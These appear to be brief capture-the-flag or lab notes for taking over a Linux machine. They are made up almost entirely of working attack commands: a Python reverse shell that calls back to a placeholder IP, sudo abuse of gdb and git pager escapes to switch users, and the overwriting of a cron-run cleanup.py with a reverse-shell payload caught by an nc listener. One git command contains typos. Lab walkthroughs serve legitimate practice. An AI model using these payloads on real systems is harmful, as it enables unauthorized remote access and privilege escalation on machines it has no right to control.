### Gain a stable shell instead of php-reverse-shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Horizontal Privilege Escalation
```
sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
```

### sudo -l again
```
(d4rckh) NOPASSWD: /usr/bin/git
```

### Horizontal Privilege Escalation again
```
PAGER='sh -c "exec sh 0<&1"' sudo -u d4rckh /usr/bin/git -p help
!/bin/sh
```
alternatively, try this
```
sudo -u d4rckh /usrbin/git help cofig
```

### Confirm the successful
`python -c 'import pty; pty.spawn("/bin/bash")'`

### Check the cleanup.py
```
cat /etc/crontab
```
it's run every 2 minutes

### Done and done (All those above escalations are somewhat redundant since not only d4rckh can edit)
```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4567));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' > cleanup.py

nc -lnvp 4567
```
